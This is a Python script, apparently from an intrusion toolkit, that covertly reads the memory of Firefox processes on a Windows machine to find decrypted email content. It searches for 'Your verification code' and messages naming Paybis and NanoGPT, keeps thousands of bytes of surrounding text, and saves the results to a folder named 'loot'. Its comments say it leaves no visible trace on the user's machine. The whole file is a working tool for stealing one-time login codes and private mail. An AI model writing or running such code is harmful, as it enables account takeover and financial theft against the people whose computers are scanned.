#!/usr/bin/env python3
"""memscan.py — passive read-only scan of firefox.exe process memory for decrypted email content.
No visible action on the user's machine. Uses OpenProcess(PROCESS_VM_READ) + VirtualQueryEx + ReadProcessMemory."""
import ctypes, ctypes.wintypes as wt, os, time, sys

k32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)

PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400
MEM_COMMIT = 0x1000

class MBI(ctypes.Structure):
    _fields_ = [('BaseAddress', ctypes.c_void_p),
                ('AllocationBase', ctypes.c_void_p),
                ('AllocationProtect', wt.DWORD),
                ('RegionSize', ctypes.c_size_t),
                ('State', wt.DWORD),
                ('Protect', wt.DWORD),
                ('Type', wt.DWORD)]

OUT = r'C:\Users\morpher\Downloads\a\session\loot\C10\memscan2.txt'
NEEDLES = []
for s in ('Your verification code', 'Paybis', 'NanoGPT'):
    NEEDLES.append(s.encode('utf-8'))
    NEEDLES.append(s.encode('utf-16-le'))
CTX_BEFORE = 1500
CTX_AFTER = 9000

# enum firefox pids — passed via argv (PS supplies them) or fallback to psutil-less enum
if len(sys.argv) > 1:
    pids = [(int(a), 0) for a in sys.argv[1:]]
else:
    import subprocess
    out = subprocess.check_output(
        ['wmic', 'process', 'where', "name='firefox.exe'", 'get', 'ProcessId,WorkingSetSize', '/format:list'],
        text=True, errors='ignore')
    pids = []
    cur = {}
    for line in out.splitlines():
        line = line.strip()
        if '=' in line:
            k, v = line.split('=', 1)
            cur[k] = v
        elif not line and cur:
            if cur.get('ProcessId'):
                pids.append((int(cur['ProcessId']), int(cur.get('WorkingSetSize') or 0)))
            cur = {}
    if cur.get('ProcessId'):
        pids.append((int(cur['ProcessId']), int(cur.get('WorkingSetSize') or 0)))
pids.sort(key=lambda p: -p[1])
print('firefox processes:', [(p, ws // (1024 * 1024)) for p, ws in pids][:8])

hits = []
log = open(OUT, 'w', encoding='utf-8')

def scan(pid, ws):
    h = k32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
    if not h:
        print('  pid %d: OpenProcess failed err=%d' % (pid, k32.GetLastError()))
        return
    addr = 0
    maxaddr = 0x7fffffffffff
    mbi = MBI()
    size = ctypes.sizeof(mbi)
    total_read = 0
    n_hits = 0
    while addr < maxaddr:
        res = k32.VirtualQueryEx(h, ctypes.c_void_p(addr), ctypes.byref(mbi), size)
        if not res:
            break
        base = mbi.BaseAddress or 0
        rsize = mbi.RegionSize
        if mbi.State == MEM_COMMIT and mbi.Protect in (0x04, 0x02, 0x40, 0x08, 0x20) and rsize < (1 << 30):
            chunk_base = base
            remaining = rsize
            CH = 4 * 1024 * 1024
            buf = (ctypes.c_char * CH)()
            while remaining > 0:
                want = min(CH, remaining)
                got = ctypes.c_size_t(0)
                ok = k32.ReadProcessMemory(h, ctypes.c_void_p(chunk_base), buf, want, ctypes.byref(got))
                if ok and got.value:
                    data = bytes(buf[:got.value])
                    total_read += got.value
                    for nd in NEEDLES:
                        start = 0
                        while True:
                            i = data.find(nd, start)
                            if i < 0:
                                break
                            ctx = data[max(0, i - CTX_BEFORE): i + CTX_AFTER]
                            hits.append((pid, nd.decode('utf-8', 'ignore'), ctx))
                            n_hits += 1
                            start = i + 1
                elif not ok:
                    err = k32.GetLastError()
                    if err not in (299,):
                        pass
                chunk_base += want
                remaining -= want
        addr = base + rsize
        if addr <= base:
            break
    k32.CloseHandle(h)
    print('  pid %d: scanned %.1f MB, hits %d' % (pid, total_read / (1024 * 1024), n_hits))
    return n_hits

for pid, ws in pids[:8]:
    scan(pid, ws)

# write contexts, dedup by rough signature
seen = set()
written = 0
for pid, nd, ctx in hits:
    key = (nd, ctx[380:420])
    if key in seen:
        continue
    seen.add(key)
    log.write('===== pid %d needle=%s =====\n' % (pid, nd))
    try:
        text = ctx.decode('utf-8', 'replace')
    except Exception:
        text = repr(ctx)
    log.write(text.replace('\x00', '') + '\n\n')
    written += 1
    if written > 400:
        break
log.close()
print('TOTAL hits:', len(hits), '| contexts written:', written, '->', OUT)